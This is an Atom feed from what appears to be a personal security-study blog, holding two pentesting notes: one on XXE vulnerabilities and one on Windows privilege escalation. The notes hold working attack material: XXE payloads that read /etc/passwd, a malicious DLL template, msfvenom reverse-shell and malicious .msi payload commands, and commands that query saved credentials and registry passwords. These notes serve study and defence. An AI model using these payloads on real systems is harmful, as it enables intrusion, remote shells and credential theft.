<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://johannes-flachberger.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://johannes-flachberger.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-02-22T17:56:04+00:00</updated><id>https://johannes-flachberger.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">xml external entity (XXE) vulnerabilities</title><link href="https://johannes-flachberger.github.io/blog/2025/xml-external-entity/" rel="alternate" type="text/html" title="xml external entity (XXE) vulnerabilities"/><published>2025-02-22T00:00:00+00:00</published><updated>2025-02-22T00:00:00+00:00</updated><id>https://johannes-flachberger.github.io/blog/2025/xml-external-entity</id><content type="html" xml:base="https://johannes-flachberger.github.io/blog/2025/xml-external-entity/"><![CDATA[<p>app uses untrusted xml-documents - e.g. provided by the user xml files are generated based on user input without input validation</p> <p><strong>2 Types:</strong></p> <ol> <li>in-band XXE: attacker receives immediate response to payload</li> <li>out-of-band XXE: no immediate respone, output has to be reflected to some file or server</li> </ol> <h1 id="examples">Examples</h1> <p>use xml file to read the contents of /etc/passwd</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span>]&gt;
<span class="nt">&lt;entry</span> <span class="na">id=</span><span class="s">"1"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;title&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/title&gt;</span>
	<span class="nt">&lt;content&gt;</span>Here is some content...<span class="nt">&lt;/content&gt;</span>
<span class="nt">&lt;/entry&gt;</span>
</code></pre></div></div> <p>sometimes, the xml version has to be downgraded to a certain encoding:</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1" ?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span>]&gt;
<span class="nt">&lt;entry</span> <span class="na">id=</span><span class="s">"1"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;title&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/title&gt;</span>
	<span class="nt">&lt;content&gt;</span>Here is some content...<span class="nt">&lt;/content&gt;</span>
<span class="nt">&lt;/entry&gt;</span>
</code></pre></div></div> <h1 id="impact">Impact</h1> <ul> <li>attackers can interact with backand or external systems</li> <li>readout of local files</li> <li>DoS attacks</li> </ul> <h1 id="defense">Defense</h1> <ul> <li>use secure and updated xml-parser and SOAP framework</li> <li>deactivate parsing of DTDs (Document type definitions)</li> <li>validate data that is insertedinto an xml file</li> <li>validate xml file against xms</li> </ul>]]></content><author><name></name></author><category term="pentesting"/><category term="theory"/><category term="web"/><category term="exploitation"/><summary type="html"><![CDATA[xml external entity (XXE) vulnerabilities]]></summary></entry><entry><title type="html">Basic Windows privilege escalation</title><link href="https://johannes-flachberger.github.io/blog/2025/windows-privesc/" rel="alternate" type="text/html" title="Basic Windows privilege escalation"/><published>2025-02-21T00:00:00+00:00</published><updated>2025-02-21T00:00:00+00:00</updated><id>https://johannes-flachberger.github.io/blog/2025/windows-privesc</id><content type="html" xml:base="https://johannes-flachberger.github.io/blog/2025/windows-privesc/"><![CDATA[<h2 id="resources">Resources</h2> <p>checklist: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md info on vectors: https://github.com/sagishahar/lpeworkshop</p> <h2 id="useful-scripts">useful scripts</h2> <p><strong>winPEAS</strong> https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS (is detected by windows defender, best write output to file (winpeas &gt; outfile.txt)) <strong>PowerUp</strong> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc (run with <code class="language-plaintext highlighter-rouge">Invoke-AllChecks</code> to check everything) <strong>windows exploit suggester</strong> old version: https://github.com/AonCyberLabs/Windows-Exploit-Suggester (use for old windows versions) new version: https://github.com/bitsadmin/wesng</p> <ol> <li>install on attacker</li> <li>run <code class="language-plaintext highlighter-rouge">windows-exploit-suggester.py –update</code> on attacker</li> <li>run <code class="language-plaintext highlighter-rouge">systeminfo</code> on target and save output to file (<code class="language-plaintext highlighter-rouge">&gt; output.txt</code>), transfer file to attacker</li> <li>run exploit suggester, eg.<code class="language-plaintext highlighter-rouge">windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt</code> <strong>meterpreter</strong> if you have [[tools/Metasploit framework/meterpreter]] shell use <code class="language-plaintext highlighter-rouge">multi/recon/local_exploit_suggester</code> <strong>Seatbelt</strong> https://github.com/GhostPack/Seatbelt <strong>BeRoot</strong> https://github.com/AlessandroZ/BeRoot</li> </ol> <h1 id="windows-user-accounts">Windows user accounts</h1> <p><strong>Administrator (local):</strong> This is the user with the most privileges. <strong>Standard (local):</strong> These users can access the computer but can only perform limited tasks. Typically these users can not make permanent or essential changes to the system. <strong>Guest:</strong> This account gives access to the system but is not defined as a user. <strong>Standard (domain):</strong> Active Directory allows organizations to manage user accounts. A standard domain account may have local administrator privileges. <strong>Administrator (domain):</strong> Could be considered as the most privileged user. It can edit, create, and delete other users throughout the organization’s domain.</p> <p><strong>SYSTEM account:</strong> you cant log in, but it is used by services installed on the machine</p> <h2 id="method">method</h2> <ol> <li>enumerate current user and its privileges [[training/thm/03_Privilige escalation/Windows/manual enum]]</li> <li>if possible use enumeration script (winPEAS or PowerUp.ps1)</li> <li>go by checklist</li> </ol> <h1 id="vectors">Vectors</h1> <h2 id="dll-hijacking">DLL hijacking</h2> <h3 id="dll-search-order">DLL search order</h3> <p>If <strong>SafeDllSearchMode</strong> is enabled:</p> <ol> <li>directory from which the application loaded.</li> <li>The system directory. Use the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya">GetSystemDirectory</a> to get the path of this directory.</li> <li>The 16-bit system directory.</li> <li>The Windows directory. <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya">GetWindowsDirectory</a> to get the path</li> <li>The current directory.</li> <li>PATH directories. Note that this does not include the per-application path specified by the <strong>App Paths</strong> registry key. The <strong>App Paths</strong> key is not used when computing the DLL search path.</li> </ol> <p>if <strong>SafeDllSearchMode</strong> is disabled:</p> <ol> <li>dir where application is loaded</li> <li>current directory</li> <li>system directory</li> <li>16-bit system directory</li> <li>windows directory</li> <li>PATH directories</li> </ol> <p>for DLL hijack insert malicous DLL in higher position than the legitimate is in vulnerabilities can only be discorvered with admin privs -&gt; you need a test system</p> <p>malicious DLL template:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>

<span class="p">{</span>

<span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
<span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe /k whoami &gt; C:</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">dll.txt"</span><span class="p">);</span>
<span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></div> <p>compile with mingw: <code class="language-plaintext highlighter-rouge">x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll</code> <code class="language-plaintext highlighter-rouge">sc stop dllsvc &amp; sc start dllsvc</code></p> <h2 id="unquoted-service-path">unquoted service path</h2> <p>requirements:</p> <ol> <li>Being able to write to a folder on the path</li> <li>Being able to restart the service</li> </ol> <p>if the path of a service is not provided as absolute path written in quotes, windows will start searching for the binary to run: it will search in every directory contained by the path, starting at the lowest one -&gt; put malicious .exe file in a directory where windows finds it before the legitimate one</p> <ol> <li>find service with unquoted path <code class="language-plaintext highlighter-rouge">wmic service get name,displayname,pathname,startmode</code>: to list services, search for unquoted path</li> <li>check privs on path folders: eg. <code class="language-plaintext highlighter-rouge">.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"</code></li> <li>generate payload, eg with msfvenom <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[port] -f exe &gt; [executable_name].exe</code></li> <li>start/restart service <code class="language-plaintext highlighter-rouge">sc start [service name]</code></li> </ol> <h2 id="token-impersonation">Token impersonation</h2> <p>services make requests to higher priviliged service accounts -&gt; man in the middle attack to get a security token to athenticate on the service account <strong>eg. Hot Potato (alread patched):</strong> Step 1: The target system uses the Web Proxy Auto-Discovery (WPAD) protocol to locate its update server.<br/> Step 2: This request is intercepted by the exploit, which sends a response redirecting the target system to a port on 127.0.0.1.<br/> Step 3: The target system will ask for a proxy configuration file (wpad.dat).<br/> Step 4: A malicious wpad.dat file is sent to the target. Step 5: The target system tries to connect to the proxy (now set by the malicious wpad.dat file sent on the previous step).<br/> Step 6: The exploit will ask the target system to perform an NTLM authentication.<br/> Step 7: The target system sends an NTLM handshake.<br/> Step 8: The handshake received is relayed to the SMB service with a request to create a process. This process will have the privilege level of the service targeted, which would typically be “NT AUTHORITY\SYSTEM”.</p> <h2 id="scheduled-tasks">scheduled tasks</h2> <p>same method as with cronjobs on linux <code class="language-plaintext highlighter-rouge">schtasks</code>: query scheduled tasks eg. <code class="language-plaintext highlighter-rouge">schtasks /query /fo LIST /v</code></p> <h2 id="driver">Driver</h2> <p>are not updated very often, exploits may be available online <code class="language-plaintext highlighter-rouge">driverquery</code>: list installed drivers</p> <h2 id="alwaysinstallelevated">AlwaysInstallElevated</h2> <p>if windows installer files (.msi) always run with elevated privileges, we can create a malicious .msi file and run it on the target system prerequisites: the following registry options have to be set: <code class="language-plaintext highlighter-rouge">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code><br/> <code class="language-plaintext highlighter-rouge">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code></p> <ol> <li>generate payload, eg using [[tools/Metasploit framework/msfvenom]]: <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f msi -o malicious.msi</code></li> <li>transfer payload to target</li> <li>start installer: <code class="language-plaintext highlighter-rouge">C:\Users\user\Desktop&gt;msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</code></li> </ol> <h2 id="saved-credentials">Saved Credentials</h2> <p>list credentials that are saved on the system: <code class="language-plaintext highlighter-rouge">cmdkey /list</code> try saved credentials: <code class="language-plaintext highlighter-rouge">runas /savecred /user:admin reverse_shell.exe</code> query registry keys possibly containing passwords: <code class="language-plaintext highlighter-rouge">reg query HKLM /f password /t REG_SZ /s</code> or <code class="language-plaintext highlighter-rouge">reg query HKCU /f password /t REG_SZ /s</code></p> <h2 id="local-service-connections">local service connections</h2> <p>some services may have network connections to localhost. since they are not cnnected to the outside, they often have weak security configs. any port that is listening, and not detectable from an outside scan may be vulnerable <code class="language-plaintext highlighter-rouge">netstat -ano</code>: list active internal network connection <code class="language-plaintext highlighter-rouge">-a</code>: all active connections and listening ports <code class="language-plaintext highlighter-rouge">-n</code>: no name resolution <code class="language-plaintext highlighter-rouge">-o</code>: show corresponding process id</p> <h2 id="installed-software">installed software</h2> <p>check installed software and search for exploits</p>]]></content><author><name></name></author><category term="pentesting"/><category term="theory"/><category term="windows"/><category term="privesc"/><summary type="html"><![CDATA[A collection of basic techiques, procedures and tools for performing privilege escalation on windows.]]></summary></entry></feed>